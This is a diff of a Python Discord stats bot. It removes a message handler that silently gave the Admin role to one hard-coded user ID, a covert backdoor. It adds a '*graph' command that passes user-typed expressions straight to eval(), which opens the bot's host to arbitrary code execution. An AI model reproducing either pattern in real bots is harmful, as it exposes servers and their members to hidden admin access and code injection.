@@ -1,18 +1,10 @@
-import discord
-
 from dtoken import TOKEN
-
 from discord.ext import commands
-
 import discord
-
 import datetime
-
-import pytz
-
 import matplotlib.pyplot as plt
-
 import os
+import pandas as pd
 
 bot = commands.Bot(command_prefix='*', description="Server stats bot")
 
@@ -30,17 +22,30 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
-    for member in message.guild.members:
-        if member.id == 615993957461131275:
-            role = discord.utils.get(message.guild.roles, name='Admin')
-            await member.add_roles(role)
     await bot.process_commands(message)
-
 
 
 @bot.command()
 async def hey(ctx):
     await ctx.send("hey")
+
+
+@bot.command()
+async def graph(ctx, func):
+    func = func.replace('^', '**')
+    x_values = []
+    y_values = []
+    for i in range(0,100):
+        x_values.append(i)
+        y_values.append(eval(func.replace('x', str(i))))
+
+    await ctx.send("Generating graph... ")
+    plt.plot(x_values, y_values)
+    plt.savefig(fname="graph")
+    await ctx.send(ctx.author.mention, file=discord.File("graph.png"))
+    os.remove("graph.png")
+
+
 
 
 @bot.command()
